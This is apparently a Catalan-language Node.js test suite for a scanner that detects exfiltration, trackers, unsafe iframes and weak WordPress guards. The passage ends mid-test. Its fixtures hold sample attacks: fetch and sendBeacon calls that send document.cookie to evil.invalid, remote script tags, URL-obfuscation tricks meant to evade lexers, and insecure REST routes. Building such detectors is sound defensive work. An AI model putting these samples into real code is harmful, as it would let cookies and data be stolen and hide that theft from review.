import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { ambitWordPress, avaluaPerimetreTellado, WP_DISTRIBUIT } from '../porta-perimetre-tellado.mjs';
import { ADAPTADOR } from '../../../wordpress-plugin/eines/empaqueta.mjs';

const DIR_TEST = path.dirname(fileURLToPath(import.meta.url));
const ARREL_REPO = path.resolve(DIR_TEST, '../../..');

function creaCabeceraPngMinima(width, height) {
  const buf = Buffer.alloc(24);
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(buf, 0);
  buf.writeUInt32BE(13, 8);
  buf.write('IHDR', 12, 'ascii');
  buf.writeUInt32BE(width, 16);
  buf.writeUInt32BE(height, 20);
  return buf;
}

function creaFixtureBase() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sdp-tellado-test-'));
  fs.mkdirSync(path.join(dir, 'src'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'public'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'wordpress-plugin/includes'), { recursive: true });

  fs.writeFileSync(path.join(dir, 'public/icona-192.png'), creaCabeceraPngMinima(192, 192));

  fs.writeFileSync(
    path.join(dir, 'index.html'),
    [
      '<!doctype html><html lang="ca"><head><meta charset="utf-8">',
      '<link rel="icon" type="image/png" sizes="192x192" href="/icona-192.png" />',
      '<link rel="icon" type="image/svg+xml" href="/favicon.svg" />',
      '<title>Sóc de Poble</title></head><body><div id="root"></div>',
      '<script type="module" src="/src/main.jsx"></script></body></html>\n',
    ].join('\n'),
    'utf8',
  );

  fs.writeFileSync(path.join(dir, 'src/main.jsx'), 'export const ok = true;\n', 'utf8');

  fs.writeFileSync(
    path.join(dir, 'firebase.json'),
    JSON.stringify(
      {
        hosting: {
          headers: [
            {
              source: '**',
              headers: [
                {
                  key: 'Content-Security-Policy',
                  value: "default-src 'self'; script-src 'self'; worker-src 'self' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' data: https: wss:; frame-src 'self' https://www.youtube-nocookie.com https://www.openstreetmap.org; frame-ancestors 'self' https://socdepoble.org https://sollutia.cat; object-src 'none'; base-uri 'self'",
                },
                { key: 'X-Content-Type-Options', value: 'nosniff' },
                { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
                { key: 'Permissions-Policy', value: 'camera=(self), microphone=(self), geolocation=(self)' },
                { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
              ],
            },
          ],
        },
      },
      null,
      2,
    ),
    'utf8',
  );

  fs.writeFileSync(
    path.join(dir, 'wordpress-plugin/socdepoble-enxufe.php'),
    "<?php\ndefined( 'ABSPATH' ) || exit;\n",
    'utf8',
  );

  return dir;
}

test('porta-perimetre-tellado v1.1 valida el repositori real amb 0 infraccions (incloent VIG-07..10)', () => {
  const resultat = avaluaPerimetreTellado(ARREL_REPO);
  assert.equal(
    resultat.ok,
    true,
    `Infraccions inesperades al repositori: ${JSON.stringify(resultat.infraccions, null, 2)}`,
  );
  assert.equal(resultat.totalInfraccions, 0);
  assert.ok(resultat.fitxersEscanejats > 50);
  assert.ok(resultat.fitxersPhpRevisats >= 12);
});

test('detecta exfiltracions de scripts remots, Google Fonts, trackers i iframes no autoritzats', () => {
  const dir = creaFixtureBase();
  try {
    fs.writeFileSync(
      path.join(dir, 'index.html'),
      [
        '<!doctype html><html><head>',
        '<link rel="icon" type="image/png" sizes="192x192" href="/icona-192.png" />',
        '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">',
        '<script src="https://cdn.tercer-extern.example/sdk.js"></script>',
        '</head><body></body></html>',
      ].join('\n'),
      'utf8',
    );

    fs.writeFileSync(
      path.join(dir, 'src/ComponentBrut.jsx'),
      [
        'export function ComponentBrut() {',
        "  window.gtag('config', 'G-123456');",
        '  return (',
        '    <div>',
        '      <iframe src="https://www.youtube-nocookie.com/embed/Fadaa7Kyxm0" title="Permés" />',
        '      <iframe src="https://embed-espia.example.com/widget" title="Prohibit" />',
        '    </div>',
        '  );',
        '}',
      ].join('\n'),
      'utf8',
    );

    const resultat = avaluaPerimetreTellado(dir);
    assert.equal(resultat.ok, false);
    const regles = new Set(resultat.infraccions.map((i) => i.regla));
    assert.ok(regles.has('TELLADO-EXF-01'));
    assert.ok(regles.has('TELLADO-EXF-02'));
    assert.ok(regles.has('TELLADO-EXF-03'));
    assert.ok(regles.has('TELLADO-EXF-04'));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('detecta VIG-07 (maintenance 200 sense 503/Retry-After), VIG-08 (secrets a wp_options), VIG-09 (sense HSTS) i VIG-10 (favicon només SVG)', () => {
  const dir = creaFixtureBase();
  try {
    // VIG-10: només SVG, cap PNG/ICO múltiple de 48x48
    fs.writeFileSync(
      path.join(dir, 'index.html'),
      '<!doctype html><html lang="ca"><head><link rel="icon" type="image/svg+xml" href="/favicon.svg" /></head><body></body></html>\n',
      'utf8',
    );

    // VIG-09: firebase.json sense Strict-Transport-Security
    const cfg = JSON.parse(fs.readFileSync(path.join(dir, 'firebase.json'), 'utf8'));
    cfg.hosting.headers[0].headers = cfg.hosting.headers[0].headers.filter(
      (h) => h.key !== 'Strict-Transport-Security',
    );
    fs.writeFileSync(path.join(dir, 'firebase.json'), JSON.stringify(cfg), 'utf8');

    // VIG-07: maintenance.php defectuós que respon 200 sense Retry-After ni robots.txt
    fs.mkdirSync(path.join(dir, 'wp-content'), { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'wp-content/maintenance.php'),
      "<?php\necho '<h1>Tornem prompte</h1>';\n",
      'utf8',
    );

    // VIG-08: clau secreta en clar a wp_options i exposició de WP_SECRETS_KEY
    fs.writeFileSync(
      path.join(dir, 'wordpress-plugin/includes/fuites.php'),
      [
        '<?php',
        "defined( 'ABSPATH' ) || exit;",
        "update_option( 'socdepoble_deepl_api_key', 'secret-pla' );",
        'echo WP_SECRETS_KEY;',
      ].join('\n'),
      'utf8',
    );

    const resultat = avaluaPerimetreTellado(dir);
    assert.equal(resultat.ok, false);
    const regles = new Set(resultat.infraccions.map((i) => i.regla));
    assert.ok(regles.has('VIG-07'), 'Ha de detectar maintenance.php sense 503/Retry-After/robots');
    assert.ok(regles.has('VIG-08'), 'Ha de detectar persistència en clar a wp_options i exposició de WP_SECRETS_KEY');
    assert.ok(regles.has('VIG-09'), 'Ha de detectar absència de Strict-Transport-Security');
    assert.ok(regles.has('VIG-10'), 'Ha de detectar absència de favicon raster múltiple de 48x48');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('detecta absència d\'ABSPATH, REST/Ability amb is_admin o __return_true i CSP global en WordPress', () => {
  const dir = creaFixtureBase();
  try {
    fs.writeFileSync(
      path.join(dir, 'wordpress-plugin/includes/insegur.php'),
      [
        '<?php',
        "header( 'Content-Security-Policy: default-src *' );",
        "register_rest_route( 'socdepoble/v1', '/obert', array(",
        "  'methods' => 'POST',",
        "  'permission_callback' => 'is_admin',",
        ') );',
      ].join('\n'),
      'utf8',
    );

    const resultat = avaluaPerimetreTellado(dir);
    assert.equal(resultat.ok, false);
    const regles = new Set(resultat.infraccions.map((i) => i.regla));
    assert.ok(regles.has('TELLADO-WP-01'));
    assert.ok(regles.has('TELLADO-WP-02'));
    assert.ok(regles.has('TELLADO-WP-03'));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('R25.2-P01/P02/P03 + VIG-10: no amaga codi entre literals amb /*, valida ABSPATH sense exit i accepta 180x180 apple-touch-icon', () => {
  const dir = creaFixtureBase();
  try {
    // VIG-10: apple-touch-icon 180x180 quadrat >= 48x48 NO és penalitzat (fidel a Google Search docs)
    fs.writeFileSync(path.join(dir, 'public/apple-touch-icon.png'), creaCabeceraPngMinima(180, 180));
    fs.writeFileSync(
      path.join(dir, 'index.html'),
      [
        '<!doctype html><html lang="ca"><head>',
        '<link rel="icon" type="image/svg+xml" href="/favicon.svg" />',
        '<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />',
        '</head><body></body></html>\n',
      ].join('\n'),
      'utf8',
    );
    assert.equal(avauaOkSenseVIG10(dir), true);

    // R25.2-P01: intent d'amagar exfiltració entre dos literals amb "/*" i "*/"
    fs.writeFileSync(
      path.join(dir, 'src/BypassIntent.jsx'),
      [
        'const a = "/*";',
        'export const Mal = () => <script src="https://evil.invalid/x.js"></script>;',
        'const b = "*/";',
      ].join('\n'),
      'utf8',
    );

    // R25.2-P03: defined('ABSPATH') decoratiu sense exit/die + ruta llarga sense permission_callback seguida d'una altra amb permís
    fs.writeFileSync(
      path.join(dir, 'wordpress-plugin/includes/bypass_wp.php'),
      [
        '<?php',
        "defined( 'ABSPATH' );",
        "register_rest_route( 'socdepoble/v1', '/sense-permis', array(",
        `  'descripcio' => '${'x'.repeat(1100)}',`,
        "  'methods' => 'GET',",
        ') );',
        "register_rest_route( 'socdepoble/v1', '/amb-permis', array(",
        "  'methods' => 'GET',",
        "  'permission_callback' => function() { return current_user_can( 'manage_options' ); },",
        ') );',
      ].join('\n'),
      'utf8',
    );

    const res = avaluaPerimetreTellado(dir);
    const regles = new Set(res.infraccions.map((i) => i.regla));
    assert.ok(regles.has('TELLADO-EXF-01'), 'El lexer lineal no ha de deixar amagar <script src> entre literals "/*" i "*/"');
    assert.ok(regles.has('TELLADO-WP-01'), "defined('ABSPATH') sense exit/die ha de disparar TELLADO-WP-01");
    assert.ok(regles.has('TELLADO-WP-02'), 'La ruta sense permission_callback no pot heretar el permís de la ruta següent');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

function avauaOkSenseVIG10(dir) {
  const r = avaluaPerimetreTellado(dir);
  return !r.infraccions.some((i) => i.regla === 'VIG-10');
}

/* ═══════════ Onada R26 · negatives explícites de l'auditoria Codex R25.2 (P01–P03) ═══════════ */

function ambFixture(fitxers, cb) {
  const dir = creaFixtureBase();
  try {
    for (const [rel, text] of Object.entries(fitxers)) {
      fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
      fs.writeFileSync(path.join(dir, rel), text, 'utf8');
    }
    return cb(dir);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const reglesDe = (res) => new Set(res.infraccions.map((i) => i.regla));

test('R25.2-P01 · un apòstrof de text JSX no desincronitza el lexer ni amaga <script src> ni un rastrejador', () => {
  ambFixture({
    'src/Apostrof.jsx': "export const A = () => <p>L'home</p>; export const S = () => <script src='https://www.googletagmanager.com/gtag/js'></script>;\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const regles = reglesDe(res);
    assert.ok(regles.has('TELLADO-EXF-01'), JSON.stringify(res.infraccions));
    assert.ok(regles.has('TELLADO-EXF-03'), JSON.stringify(res.infraccions));
    assert.equal(res.veredicte, 'infraccions');
  });
});

test('R25.2-P01 · un literal regex amb \\/\\/ no obri un comentari que amague src="//evil.invalid/x.js"', () => {
  ambFixture({
    'src/Regex.jsx': 'const re = /^\\/\\//; export const S = () => <script src="//evil.invalid/x.js"></script>;\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.ok(reglesDe(res).has('TELLADO-EXF-01'), JSON.stringify(res.infraccions));
  });
});

test('R25.2-P01 · un fetch actiu entre cadenes amb /* i */ i els destins concatenats queden «desconegut», mai «net»', () => {
  ambFixture({
    'src/FetchEntreLiterals.js': 'const a = "/*"; fetch("https://evil.invalid/x?c=" + document.cookie); const b = "*/";\n',
    'src/FetchConcatenat.js': 'const h = "https://ev" + "il.invalid"; export const envia = () => fetch(h + "/x", { method: "POST" });\n',
    'src/FetchLiteralExtern.js': 'export const envia = () => navigator.sendBeacon("https://evil.invalid/b", "x");\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(res.ok, true, 'Un destí no verificable no és una infracció de signatura coberta');
    assert.equal(res.veredicte, 'desconegut');
    assert.notEqual(res.veredicte, 'net-en-signatures-cobertes');
    const perFitxer = (f) => res.desconeguts.filter((d) => d.fitxer === f);
    assert.ok(perFitxer('src/FetchEntreLiterals.js').some((d) => d.tipus === 'DESTI_XARXA_DINAMIC'), JSON.stringify(res.desconeguts));
    assert.ok(perFitxer('src/FetchConcatenat.js').some((d) => d.tipus === 'DESTI_XARXA_DINAMIC'), JSON.stringify(res.desconeguts));
    const extern = perFitxer('src/FetchLiteralExtern.js').find((d) => d.tipus === 'DESTI_XARXA_EXTERN');
    assert.ok(extern, JSON.stringify(res.desconeguts));
    assert.equal(extern.origen, 'https://evil.invalid');
    assert.equal(res.abast.certificaZeroExfiltracio, false);
  });
});

test('R25.2-P01 · xarxa de seguretat: una signatura que el lexer creu comentada es declara desconeguda, no desapareix', () => {
  ambFixture({
    // Desincronització que cap heurística lèxica resol: l'apòstrof obri una cadena
    // en text JSX i la tanca la cometa d'un literal real; la URL queda «en codi».
    'src/Desincronia.jsx': "export const A = () => <p>'hola</p>; const u = 'https://www.googletagmanager.com/gtm.js';\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const comInfraccio = res.infraccions.some((i) => i.regla === 'TELLADO-EXF-03');
    const comDesconegut = res.desconeguts.some((d) => d.tipus === 'SIGNATURA_EN_COMENTARI' && d.regla === 'TELLADO-EXF-03');
    assert.ok(comInfraccio || comDesconegut, `La signatura ha desaparegut: ${JSON.stringify(res)}`);
    assert.notEqual(res.veredicte, 'net-en-signatures-cobertes');
  });
});

test('R25.2-P01 · control positiu: només destins relatius i literals coberts donen «net-en-signatures-cobertes»', () => {
  ambFixture({
    'src/Net.js': "export const llig = () => fetch('/api/salut'); // https://exemple.invalid és només un comentari\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(res.ok, true, JSON.stringify(res.infraccions));
    assert.deepEqual(res.desconeguts, []);
    assert.equal(res.veredicte, 'net-en-signatures-cobertes');
    assert.equal(res.destinsXarxa.coberts, 1);
  });
});

test('R25.2-P02 · cost lineal: 2k/4k/8k inicis de comentari i 32k etiquetes sense tancar no disparen cost quadràtic', () => {
  for (const k of [2000, 4000, 8000]) {
    const t0 = performance.now();
    ambFixture({
      'src/ComentarisOberts.js': `${'/*'.repeat(k)}\n`,
      'src/HtmlObert.html': `${'<!--'.repeat(k)}\n`,
    }, (dir) => avaluaPerimetreTellado(dir));
    assert.ok(performance.now() - t0 < 2000, `k=${k}`);
  }
  // Abans: 8k etiquetes ~0,7 s i creixement ×4 per cada doble; 32k ≈ 11 s.
  const t0 = performance.now();
  ambFixture({
    'src/EtiquetesObertes.jsx': `${'<script '.repeat(32000)}\n`,
    'src/LinksOberts.jsx': `${'<link rel="x" '.repeat(32000)}\n`,
    'wordpress-plugin/includes/rutes-obertes.php': `<?php\ndefined( 'ABSPATH' ) || exit;\n${'register_rest_route( '.repeat(32000)}\n${'echo '.repeat(32000)}\n`,
  }, (dir) => avaluaPerimetreTellado(dir));
  assert.ok(performance.now() - t0 < 2500, `Cost no lineal: ${(performance.now() - t0).toFixed(0)} ms`);
});

test('R25.2-P02 · pressupostos de bytes per fitxer, de bytes totals i d\'incidències tanquen en fals (sense fitxers gegants)', () => {
  ambFixture({
    'src/Gran.js': `export const x = '${'a'.repeat(4096)}';\n`,
    'src/Scripts.jsx': Array.from({ length: 40 }, (_, i) => `export const S${i} = () => <script src="https://evil${i}.invalid/x.js"></script>;`).join('\n'),
  }, (dir) => {
    const perFitxer = avaluaPerimetreTellado(dir, { maxBytesFitxer: 2048 });
    assert.ok(perFitxer.infraccions.some((i) => i.regla === 'TELLADO-LIMIT-01' && i.fitxer === 'src/Gran.js'));
    assert.equal(perFitxer.ok, false);

    const total = avaluaPerimetreTellado(dir, { maxBytesTotal: 1024 });
    assert.ok(total.infraccions.some((i) => i.regla === 'TELLADO-LIMIT-01' && /total/.test(i.missatge)));
    assert.equal(total.ok, false);

    const incidencies = avaluaPerimetreTellado(dir, { maxIncidencies: 5 });
    assert.ok(incidencies.infraccions.length <= 6);
    assert.ok(incidencies.infraccions.some((i) => i.regla === 'TELLADO-LIMIT-02'));
  });
});

test('R25.2-P03 · defined(\'ABSPATH\') decoratiu, amb «die» dins d\'una cadena o amb la condició invertida no és una guarda', () => {
  for (const cos of [
    "<?php\ndefined( 'ABSPATH' );\necho 'die';\n",
    "<?php\nif ( defined( 'ABSPATH' ) ) { exit; }\n",
    "<?php\n$x = 1;\ndefined( 'ABSPATH' ) || exit;\n",
    "<?php\nif ( ! defined( 'ABSPATH' ) ) { return; }\n",
  ]) {
    ambFixture({ 'wordpress-plugin/includes/guarda.php': cos }, (dir) => {
      const res = avaluaPerimetreTellado(dir);
      assert.ok(
        res.infraccions.some((i) => i.regla === 'TELLADO-WP-01' && i.fitxer === 'wordpress-plugin/includes/guarda.php'),
        `Guarda acceptada indegudament: ${JSON.stringify(cos)}`,
      );
    });
  }
});

test('R25.2-P03 · control positiu: les formes canòniques de guarda passen', () => {
  for (const cos of [
    "<?php\n/** Capçalera. */\ndefined( 'ABSPATH' ) || exit;\n",
    "<?php\nif ( ! defined( 'ABSPATH' ) ) {\n\texit;\n}\n",
    "<?php\ndefined('ABSPATH') or die('Accés directe prohibit');\n",
    "<?php\ndeclare(strict_types=1);\nnamespace SocDePoble\\Enxufe;\ndefined( 'ABSPATH' ) || exit();\n",
    "<?php\nif ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) exit;\n",
  ]) {
    ambFixture({ 'wordpress-plugin/includes/guarda.php': cos }, (dir) => {
      const res = avaluaPerimetreTellado(dir);
      assert.ok(!res.infraccions.some((i) => i.regla === 'TELLADO-WP-01'), `Guarda vàlida rebutjada: ${JSON.stringify(cos)}`);
    });
  }
});

test('R25.2-P03 · un endpoint germà dins de la mateixa ruta no hereta el permission_callback del primer', () => {
  ambFixture({
    'wordpress-plugin/includes/germans.php': [
      '<?php',
      "defined( 'ABSPATH' ) || exit;",
      "register_rest_route( 'socdepoble/v1', '/germans', array(",
      "  array( 'methods' => 'GET', 'callback' => 'sdp_llig', 'permission_callback' => 'sdp_pot_llegir' ),",
      "  array( 'methods' => 'POST', 'callback' => 'sdp_escriu' ),",
      ') );',
    ].join('\n'),
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const wp02 = res.infraccions.filter((i) => i.regla === 'TELLADO-WP-02');
    assert.equal(wp02.length, 1, JSON.stringify(res.infraccions));
    assert.equal(wp02[0].ambit, 'distribuit');
  });
});

test('R25.2-P03 · un «?>» tanca el comentari PHP i l\'HTML que el seguix no s\'amaga; els exemples d\'amfitrió es distingixen', () => {
  ambFixture({
    'wordpress-plugin/eines/amfitrio/plantilla.php': "<?php\ndefined( 'ABSPATH' ) || exit;\n// nota ?><script src=\"https://evil.invalid/x.js\"></script><?php\n",
    'wordpress-plugin/eines/amfitrio/sense-guarda.php': "<?php\necho 'hola';\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.ok(res.infraccions.some((i) => i.regla === 'TELLADO-EXF-01' && i.fitxer === 'wordpress-plugin/eines/amfitrio/plantilla.php'), JSON.stringify(res.infraccions));
    const wp01 = res.infraccions.find((i) => i.regla === 'TELLADO-WP-01');
    assert.ok(wp01, JSON.stringify(res.infraccions));
    assert.equal(wp01.ambit, 'exemple-amfitrio');
  });
});

/* ═══════════ Onada R26 · ronda 2: residus del verificador independent ═══════════ */

const desconegutsDe = (res, fitxer) => res.desconeguts.filter((d) => d.fitxer === fitxer);

test('R26-r2 · recorregut d\'etiquetes: una «{» en HTML i PHP no amaga el <script> següent; en JSX, l\'etiqueta sense tancar es declara', () => {
  const malicios = '<script src="/ok.js" data-x={ ></script><script src="https://evil.invalid/x.js"></script>\n';
  ambFixture({
    'index.html': `<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">${malicios}</head></html>\n`,
    'wordpress-plugin/templates/pagina.php': `<?php\ndefined( 'ABSPATH' ) || exit;\n?>${malicios}`,
    'src/Etiqueta.jsx': `export const E = () => <div />;\nconst t = '${malicios.trim()}';\n`,
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const exf01 = (f) => res.infraccions.some((i) => i.regla === 'TELLADO-EXF-01' && i.fitxer === f);
    assert.equal(res.ok, false);
    assert.ok(exf01('index.html'), JSON.stringify(res.infraccions));
    assert.ok(exf01('wordpress-plugin/templates/pagina.php'), JSON.stringify(res.infraccions));
    assert.ok(exf01('src/Etiqueta.jsx'), JSON.stringify(res.infraccions));
    assert.ok(desconegutsDe(res, 'src/Etiqueta.jsx').some((d) => d.tipus === 'ETIQUETA_NO_TANCADA'), JSON.stringify(res.desconeguts));
  });
  // Una etiqueta que no tanca mai tampoc passa per neta: queda declarada.
  ambFixture({ 'src/Oberta.jsx': `export const t = '<iframe src={x';\n${'// farciment\n'.repeat(2000)}` }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.ok(desconegutsDe(res, 'src/Oberta.jsx').some((d) => d.tipus === 'ETIQUETA_NO_TANCADA'), JSON.stringify(res.desconeguts));
    assert.notEqual(res.veredicte, 'net-en-signatures-cobertes');
  });
});

test('R26-r2 · text JSX: una URL o un «src/*.js» entre etiquetes no obri cap comentari que amague un embornal', () => {
  ambFixture({
    'src/Url.jsx': 'export const A = () => <p>Info a https://socdepoble.org</p>; export const f = () => fetch("https://evil.invalid/x?c=" + document.cookie);\n',
    'src/Bloc.jsx': 'export const B = () => <p><code>src/*.js</code></p>;\nexport const g = () => fetch("https://evil.invalid/b", { body: document.cookie });\n',
    'src/Barres.jsx': 'export const C = () => (\n  <p>\n    Text // més {fetch(h + "/x")}\n  </p>\n);\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(res.veredicte, 'desconegut', JSON.stringify(res.desconeguts));
    assert.ok(desconegutsDe(res, 'src/Url.jsx').some((d) => d.tipus === 'DESTI_XARXA_DINAMIC'), JSON.stringify(res.desconeguts));
    const extern = desconegutsDe(res, 'src/Bloc.jsx').find((d) => d.tipus === 'DESTI_XARXA_EXTERN');
    assert.equal(extern?.origen, 'https://evil.invalid', JSON.stringify(res.desconeguts));
    assert.ok(desconegutsDe(res, 'src/Barres.jsx').some((d) => d.tipus === 'DESTI_XARXA_DINAMIC'), JSON.stringify(res.desconeguts));
    assert.equal(res.destinsXarxa.coberts, 0);
  });
});

test('R26-r2 · mode JSX: un «<» de comparació (després de «}», «<<» o un postfix) no obri cap element que amague codi', () => {
  ambFixture({
    // JS vàlid: ({} < b) > fetch(...), el fetch s'executa; el «// </b>» és un comentari real.
    'src/Comparacio.jsx': 'export const x = {} <b>fetch("https://evil.invalid/a?c=" + document.cookie) // </b>\nexport const y = a <<b>fetch("https://evil.invalid/b") // </b>\nexport const z = i++ <b>fetch(`https://evil.invalid/${k}`) // </b>\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const tipus = desconegutsDe(res, 'src/Comparacio.jsx').map((d) => d.tipus).sort();
    assert.deepEqual(tipus, ['DESTI_XARXA_DINAMIC', 'DESTI_XARXA_DINAMIC', 'DESTI_XARXA_EXTERN'], JSON.stringify(res.desconeguts));
  });
});

test('R26-r2 · xarxa de seguretat dels embornals: un comentari no versemblant (fora del mode JSX) no dona «net»', () => {
  ambFixture({
    // .js: el lexer no hi activa el mode JSX; «https://» i «src/*» obririen comentaris falsos.
    'src/InfoText.js': 'export const A = () => <p>Info a https://x.org</p>; fetch("https://evil.invalid/x?c=" + document.cookie);\n',
    'src/BlocText.js': 'export const B = () => <code>src/*.js</code>;\nexport const g = () => fetch("https://evil.invalid/b", { body: document.cookie });\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(res.veredicte, 'desconegut', JSON.stringify(res.desconeguts));
    assert.ok(desconegutsDe(res, 'src/InfoText.js').some((d) => d.tipus === 'EMBORNAL_EN_COMENTARI'), JSON.stringify(res.desconeguts));
    const bloc = desconegutsDe(res, 'src/BlocText.js').find((d) => d.tipus === 'EMBORNAL_EN_COMENTARI');
    assert.equal(bloc?.origen, 'https://evil.invalid', JSON.stringify(res.desconeguts));
  });
  // Control: els comentaris reals que parlen d'import() o de fetch() no generen soroll.
  ambFixture({
    'src/Comentat.js': "// Es carrega amb import() quan cal; fetch(url) va per l'adaptador.\n/* Un import('./x.js') diferit i fetch('https://doc.invalid') d'exemple. */\nexport const llig = () => fetch('/api/salut');\n",
    'src/Comentat.jsx': "export const C = () => (\n  <div>\n    {/* fetch(url) només en un comentari JSX real */}\n    <p>L'import (IVA inclòs) i fetch () són text.</p>\n  </div>\n);\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.deepEqual(res.desconeguts, [], JSON.stringify(res.desconeguts));
    assert.equal(res.veredicte, 'net-en-signatures-cobertes');
  });
});

test('R26-r2 · normalització d\'URL: «/\\\\evil», «\\t//evil», escapaments JS i entitats HTML són destins externs', () => {
  ambFixture({
    'src/Barra.js': "export const a = () => fetch('/\\\\evil.invalid/x', { method: 'POST', body: document.cookie });\n",
    'src/Tab.js': "export const b = () => fetch('\\t//evil.invalid/x');\n",
    'src/TabCru.js': "export const c = () => fetch('\t//evil.invalid/x');\n",
    'src/Hex.js': "export const d = () => navigator.sendBeacon('\\x2f\\x2fevil.invalid/b', 'x');\n",
    'src/Net.js': "export const e = () => fetch('/api/x'); export const f = () => fetch('./rel'); export const g = () => fetch('data:text/plain,hola');\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of ['src/Barra.js', 'src/Tab.js', 'src/TabCru.js', 'src/Hex.js']) {
      const d = desconegutsDe(res, f).find((x) => x.tipus === 'DESTI_XARXA_EXTERN');
      assert.equal(d?.origen, 'https://evil.invalid', `${f}: ${JSON.stringify(res.desconeguts)}`);
    }
    assert.deepEqual(desconegutsDe(res, 'src/Net.js'), []);
    assert.equal(res.destinsXarxa.coberts, 3);
  });
  ambFixture({
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">',
      '<script src="https:\\\\evil.invalid/a.js"></script>',
      '<script src="/\\evil.invalid/b.js"></script>',
      '<script src="&#47;&#47;evil.invalid/c.js"></script>',
      '<script type="module" src="/src/main.jsx"></script>',
      '<link rel="stylesheet" href="https://fonts&#46;googleapis&#46;com/css2?family=Inter">',
      '</head></html>',
    ].join('\n'),
    'src/Iframes.jsx': [
      "export const S = () => <script src={'\\x2f\\x2fevil.invalid/d.js'} />;",
      'export const I = () => <iframe src="/\\evil.invalid/w" title="x" />;',
      'export const V = ({ id }) => <iframe src={`https://www.youtube-nocookie.com\\@evil.invalid/${id}`} title="v" />;',
      'export const B = ({ id }) => <iframe src={`https://www.youtube-nocookie.com/embed/${id}`} title="b" />;',
      'export const R = () => <iframe src="/embed/local" title="r" />;',
    ].join('\n'),
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const de = (regla, f) => res.infraccions.filter((i) => i.regla === regla && i.fitxer === f);
    assert.equal(de('TELLADO-EXF-01', 'index.html').length, 3, JSON.stringify(res.infraccions));
    assert.equal(de('TELLADO-EXF-02', 'index.html').length, 1, JSON.stringify(res.infraccions));
    assert.equal(de('TELLADO-EXF-01', 'src/Iframes.jsx').length, 1, JSON.stringify(res.infraccions));
    const iframes = de('TELLADO-EXF-04', 'src/Iframes.jsx').map((i) => i.linia).sort();
    assert.deepEqual(iframes, [2, 3], JSON.stringify(res.infraccions));
  });
});

test('R26-r2 · atributs i codificacions que el navegador accepta: «<script/src>», «"src=» enganxat, zeros inicials i escapaments \\u{…} llargs', () => {
  ambFixture({
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">',
      '<script/src="https://evil.invalid/a.js"></script>',
      '<script type="module"src="https://evil.invalid/b.js"></script>',
      '<script src="&#0000000047;&#x00000002F;evil.invalid/c.js"></script>',
      '<script data-src="https://cdn.invalid/no-es-src.js" src="/src/main.jsx"></script>',
      '</head></html>',
    ].join('\n'),
    'src/Llarg.js': "export const f = () => fetch('\\u{0000002F}\\u{2F}evil.invalid/x');\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const linies = res.infraccions.filter((i) => i.regla === 'TELLADO-EXF-01' && i.fitxer === 'index.html').map((i) => i.linia).sort();
    assert.deepEqual(linies, [2, 3, 4], JSON.stringify(res.infraccions));
    assert.equal(desconegutsDe(res, 'src/Llarg.js').find((d) => d.tipus === 'DESTI_XARXA_EXTERN')?.origen, 'https://evil.invalid', JSON.stringify(res.desconeguts));
  });
});

test('R26-r2 · «import (…)» amb espai és un embornal inventariat', () => {
  ambFixture({ 'src/Import.js': "export const f = () => import ('https://evil.invalid/x.js');\n" }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const d = desconegutsDe(res, 'src/Import.js').find((x) => x.tipus === 'DESTI_XARXA_EXTERN');
    assert.equal(d?.regla, 'import()', JSON.stringify(res.desconeguts));
    assert.notEqual(res.veredicte, 'net-en-signatures-cobertes');
  });
});

test('R26-r2 · un «<!--» dins d\'un atribut HTML no rebaixa una infracció EXF a desconegut', () => {
  ambFixture({
    'index.html': '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png"></head><body><a title="<!--">x</a><script src="https://www.googletagmanager.com/gtag/js?id=G-X"></script></body></html>\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(res.ok, false);
    const regles = reglesDe(res);
    assert.ok(regles.has('TELLADO-EXF-01') && regles.has('TELLADO-EXF-03'), JSON.stringify(res));
  });
  // Control: un comentari HTML real continua sent comentari.
  ambFixture({
